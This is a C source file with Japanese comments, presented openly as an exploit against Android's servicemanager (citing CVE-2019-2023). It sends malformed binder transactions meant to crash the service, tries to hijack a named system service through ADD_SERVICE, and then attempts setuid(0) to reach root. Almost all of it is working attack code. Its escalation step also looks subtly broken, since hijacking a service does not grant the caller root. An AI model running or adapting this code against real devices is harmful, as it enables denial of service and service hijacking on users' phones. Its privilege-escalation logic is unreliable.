/*
 * ========================================================================
 *  Android Servicemanager 多ベクター悪用検証（CVE-2019-2023 他）
 *  統合版：JNI コードの正しい binder トランザクション構築を採用
 *  コンパイル: arm-linux-androideabi-gcc -static -o exploit servicemanager_exploit_final.c
 *  用法: ./exploit [ターゲットサービス名]
 *  ログ: /data/local/tmp/servicemanager_exploit.log
 * ========================================================================
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/stat.h>
#include <time.h>
#include <pthread.h>

/* binder.h を同ディレクトリに配置（提供済み） */
#include "binder.h"

/* ============================================================
   設定
   ============================================================ */
#define OUTPUT_FILE         "/data/local/tmp/servicemanager_exploit.txt"
#define LOG_FILE            "/data/local/tmp/servicemanager_exploit.log"
#define TARGET_SERVICE_DEFAULT "persistent_data_block"

static volatile int g_exploit_success = 0;
static pid_t g_servicemanager_pid = 0;
static char g_target_service[256];

/* ============================================================
   ログ＆ユーティリティ
   ============================================================ */
static void log_msg(const char *msg) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (fp) {
        fprintf(fp, "[%ld] %s\n", time(NULL), msg);
        fclose(fp);
    }
}

static pid_t get_servicemanager_pid(void) {
    FILE *fp = popen("pidof servicemanager", "r");
    if (!fp) return -1;
    char pid_str[16];
    if (!fgets(pid_str, sizeof(pid_str), fp)) {
        pclose(fp);
        return -1;
    }
    pclose(fp);
    pid_t pid = atoi(pid_str);
    return (pid > 0) ? pid : -1;
}

static int wait_for_servicemanager_restart(pid_t old_pid, int timeout_sec) {
    printf("[*] Waiting for servicemanager to restart (up to %d sec)...\n", timeout_sec);
    while (timeout_sec-- > 0) {
        pid_t new_pid = get_servicemanager_pid();
        if (new_pid > 0 && new_pid != old_pid) {
            printf("[+] servicemanager restarted with PID %d\n", new_pid);
            g_servicemanager_pid = new_pid;
            return 0;
        }
        sleep(1);
    }
    printf("[-] Timeout waiting for servicemanager restart.\n");
    return -1;
}

/* ============================================================
   Binder トランザクション送信ヘルパー（JNI コードから採用）
   ============================================================ */
static int send_binder_transaction(int fd, uint32_t handle, uint32_t code,
                                   uint32_t flags, const void *data,
                                   size_t data_size, size_t offsets_size,
                                   const void *offsets,
                                   void *reply_buf, size_t reply_buf_size,
                                   size_t *read_consumed) {
    struct binder_write_read bwr;
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;

    memset(&tx, 0, sizeof(tx));
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = handle;
    tx.tdata.code = code;
    tx.tdata.flags = flags;
    tx.tdata.data_size = data_size;
    tx.tdata.offsets_size = offsets_size;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    if (reply_buf && reply_buf_size > 0) {
        bwr.read_size = reply_buf_size;
        bwr.read_buffer = (binder_uintptr_t)reply_buf;
    }

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (read_consumed)
        *read_consumed = bwr.read_consumed;
    return ret;
}

/* ============================================================
   クラッシュベクター（各ベクターは正しいパーセル構築を使用）
   ============================================================ */

/* 1. 不正な GET_SERVICE（インターフェース記述子を省略） */
static int crash_get_service_malformed(void) {
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) { perror("  open binder"); return -1; }

    const char *service_name = g_target_service;
    size_t name_len = strlen(service_name) + 1;  // null 終端含む
    // パーセル形式： [4バイト長][文字列データ] のみ（インターフェース名なし）
    size_t total_len = 4 + name_len;
    uint8_t *data = malloc(total_len);
    if (!data) { close(fd); return -1; }

    // 長さをリトルエンディアンで書き込み
    data[0] = (name_len >> 0) & 0xFF;
    data[1] = (name_len >> 8) & 0xFF;
    data[2] = (name_len >> 16) & 0xFF;
    data[3] = (name_len >> 24) & 0xFF;
    memcpy(data + 4, service_name, name_len);

    printf("[*] Sending malformed GET_SERVICE (no interface descriptor)...\n");
    int ret = send_binder_transaction(fd, 0, 1, 0, data, total_len, 0, NULL,
                                      NULL, 0, NULL);
    free(data);
    close(fd);
    if (ret < 0) perror("  ioctl");
    log_msg("Malformed GET_SERVICE sent");
    return ret;
}

/* 2. 超大サービス名（8KB）での ADD_SERVICE */
static int crash_huge_service_name(void) {
    printf("[*] Sending ADD_SERVICE with 8KB service name...\n");
    char *payload = malloc(8192);
    if (!payload) return -1;
    memset(payload, 'A', 8191);
    payload[8191] = '\0';

    size_t name_len = 8192;  // null 含む
    size_t total_len = 4 + name_len;
    uint8_t *data = malloc(total_len);
    if (!data) { free(payload); return -1; }
    data[0] = (name_len >> 0) & 0xFF;
    data[1] = (name_len >> 8) & 0xFF;
    data[2] = (name_len >> 16) & 0xFF;
    data[3] = (name_len >> 24) & 0xFF;
    memcpy(data + 4, payload, name_len);

    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) { free(payload); free(data); return -1; }
    int ret = send_binder_transaction(fd, 0, 2, 0, data, total_len, 0, NULL,
                                      NULL, 0, NULL);
    free(payload);
    free(data);
    close(fd);
    if (ret < 0) perror("  ioctl HUGE_NAME");
    return ret;
}

/* 3. 無効なオフセット（範囲外） */
static int crash_invalid_offsets(void) {
    printf("[*] Sending transaction with invalid offsets...\n");
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) return -1;

    uint8_t *data = malloc(4096);
    if (!data) { close(fd); return -1; }
    memset(data, 0x41, 4096);

    binder_size_t offsets[10];
    for (int i = 0; i < 10; i++)
        offsets[i] = 8192 + i * 8;  // data サイズを超える

    int ret = send_binder_transaction(fd, 0, 0, 0,
                                      data, 4096, sizeof(offsets), offsets,
                                      NULL, 0, NULL);
    free(data);
    close(fd);
    if (ret < 0) perror("  ioctl INVALID_OFFSETS");
    return ret;
}

/* 4. NULL データバッファポインタ */
static int crash_null_buffer(void) {
    printf("[*] Sending transaction with NULL data buffer...\n");
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) return -1;

    // data ポインタを 0 に設定
    int ret = send_binder_transaction(fd, 0, 0, 0,
                                      NULL, 1024, 0, NULL,
                                      NULL, 0, NULL);
    close(fd);
    if (ret < 0) perror("  ioctl NULL_BUFFER");
    return ret;
}

/* 5. BC_TRANSACTION_SG による異常な extra_buffers */
static int crash_transaction_sg(void) {
    printf("[*] Sending BC_TRANSACTION_SG with large extra_buffers...\n");
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) return -1;

    size_t extra_size = 64 * 1024;
    uint8_t *extra = malloc(extra_size);
    if (!extra) { close(fd); return -1; }
    memset(extra, 0x42, extra_size);

    struct binder_transaction_data_sg tr_sg;
    memset(&tr_sg, 0, sizeof(tr_sg));
    tr_sg.transaction_data.target.handle = 0;
    tr_sg.transaction_data.code = 0;
    tr_sg.transaction_data.flags = 0;
    tr_sg.transaction_data.data_size = 0;
    tr_sg.transaction_data.offsets_size = 0;
    tr_sg.transaction_data.data.ptr.buffer = 0;
    tr_sg.buffers_size = extra_size;

    struct {
        uint32_t cmd;
        struct binder_transaction_data_sg data;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION_SG;
    tx.data = tr_sg;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(extra);
    close(fd);
    if (ret < 0) perror("  ioctl BC_TRANSACTION_SG");
    return ret;
}

/* 6. 不正な BINDER_GET_NODE_INFO_FOR_REF（コンテキストマネージャ権限が必要） */
static int crash_get_node_info(void) {
    printf("[*] Trying BINDER_GET_NODE_INFO_FOR_REF with invalid handle...\n");
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) return -1;

    struct binder_node_info_for_ref info;
    memset(&info, 0, sizeof(info));
    info.handle = 0xdeadbeef;

    int ret = ioctl(fd, BINDER_GET_NODE_INFO_FOR_REF, &info);
    close(fd);
    if (ret < 0) perror("  ioctl GET_NODE_INFO");
    return ret;
}

/* 7. マルチスレッド同時攻撃（各スレッドが異なるベクターを実行） */
static void *crash_thread_func(void *arg) {
    int vector = (int)(long)arg;
    switch (vector) {
        case 0: crash_get_service_malformed(); break;
        case 1: crash_huge_service_name(); break;
        case 2: crash_invalid_offsets(); break;
        case 3: crash_null_buffer(); break;
        case 4: crash_transaction_sg(); break;
        default: break;
    }
    return NULL;
}

static void concurrent_crash_attack(void) {
    printf("[*] Launching concurrent crash threads...\n");
    pthread_t threads[5];
    for (int i = 0; i < 5; i++)
        pthread_create(&threads[i], NULL, crash_thread_func, (void*)(long)i);
    for (int i = 0; i < 5; i++)
        pthread_join(threads[i], NULL);
}

/* ============================================================
   サービスの乗っ取り（ADD_SERVICE）
   ============================================================ */
static int hijack_servicemanager_add_service(const char *service_name) {
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data = malloc(total_len);
    if (!data) return -1;

    data[0] = (name_len >> 0) & 0xFF;
    data[1] = (name_len >> 8) & 0xFF;
    data[2] = (name_len >> 16) & 0xFF;
    data[3] = (name_len >> 24) & 0xFF;
    memcpy(data + 4, service_name, name_len);

    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) { free(data); return -1; }

    uint8_t reply[4096];
    size_t read_consumed = 0;
    int ret = send_binder_transaction(fd, 0, 2, 0,
                                      data, total_len, 0, NULL,
                                      reply, sizeof(reply), &read_consumed);
    free(data);
    close(fd);

    if (ret == 0 && read_consumed >= 4 && ((uint32_t*)reply)[0] == BR_OK) {
        printf("[+] ADD_SERVICE succeeded for '%s'\n", service_name);
        return 0;
    } else {
        printf("[-] ADD_SERVICE failed (ret=%d, read_consumed=%zu, reply=0x%x)\n",
               ret, read_consumed, read_consumed >= 4 ? ((uint32_t*)reply)[0] : 0);
        return -1;
    }
}

/* ============================================================
   メイン
   ============================================================ */
int main(int argc, char **argv) {
    if (argc > 1)
        strncpy(g_target_service, argv[1], sizeof(g_target_service)-1);
    else
        strcpy(g_target_service, TARGET_SERVICE_DEFAULT);

    printf("============================================================\n");
    printf("  Android Servicemanager Multi-Vector Exploit (Final)\n");
    printf("  Target service: %s\n", g_target_service);
    printf("============================================================\n\n");

    FILE *fp = fopen(LOG_FILE, "w");
    if (fp) { fprintf(fp, "=== Exploit Log ===\n"); fclose(fp); }

    g_servicemanager_pid = get_servicemanager_pid();
    if (g_servicemanager_pid > 0)
        printf("[+] Current servicemanager PID: %d\n", g_servicemanager_pid);
    else
        printf("[-] Could not find servicemanager.\n");

    /* ---------- フェーズ1: 多ベクタークラッシュ ---------- */
    printf("\n[*] Phase 1: Crashing servicemanager with multiple vectors...\n");
    int crashed = 0;
    for (int attempt = 0; attempt < 3 && !crashed; attempt++) {
        printf("[*] Attempt %d/3\n", attempt+1);

        crash_get_service_malformed(); usleep(100000);
        crash_huge_service_name(); usleep(100000);
        crash_invalid_offsets(); usleep(100000);
        crash_null_buffer(); usleep(100000);
        crash_transaction_sg(); usleep(100000);
        crash_get_node_info(); usleep(100000);
        concurrent_crash_attack(); usleep(300000);

        pid_t new_pid = get_servicemanager_pid();
        if (new_pid != g_servicemanager_pid && new_pid > 0) {
            printf("[+] servicemanager crashed (PID %d -> %d)\n",
                   g_servicemanager_pid, new_pid);
            crashed = 1;
            g_servicemanager_pid = new_pid;
        }
    }

    if (crashed) {
        wait_for_servicemanager_restart(g_servicemanager_pid, 10);
    } else {
        printf("[-] servicemanager did not crash. Continuing anyway...\n");
    }

    /* ---------- フェーズ2: サービス乗っ取り ---------- */
    printf("\n[*] Phase 2: Attempting to hijack service '%s'...\n", g_target_service);
    if (hijack_servicemanager_add_service(g_target_service) == 0) {
        printf("[+] Service hijacked successfully!\n");
        g_exploit_success = 1;

        printf("[*] Attempting privilege escalation (setuid(0))...\n");
        if (setuid(0) == 0) {
            printf("[+] setuid(0) succeeded!\n");
            system("id > " OUTPUT_FILE " 2>&1");
        } else if (setresuid(0,0,0) == 0) {
            printf("[+] setresuid(0,0,0) succeeded!\n");
            system("id > " OUTPUT_FILE " 2>&1");
        } else {
            printf("[-] setuid failed (errno=%d).\n", errno);
        }
        system("cat " OUTPUT_FILE);
    }

    /* ---------- フェーズ3: フォールバック setuid ---------- */
    if (!g_exploit_success) {
        printf("\n[*] Phase 3: Fallback setuid(0) attempt...\n");
        if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
            printf("[+] Fallback setuid succeeded!\n");
            system("id > " OUTPUT_FILE " 2>&1");
            system("cat " OUTPUT_FILE);
            g_exploit_success = 1;
        }
    }

    printf("\n============================================================\n");
    printf("  Exploit finished. Success: %s\n", g_exploit_success ? "YES" : "NO");
    printf("  Log file: %s\n", LOG_FILE);
    return g_exploit_success ? 0 : 1;
}
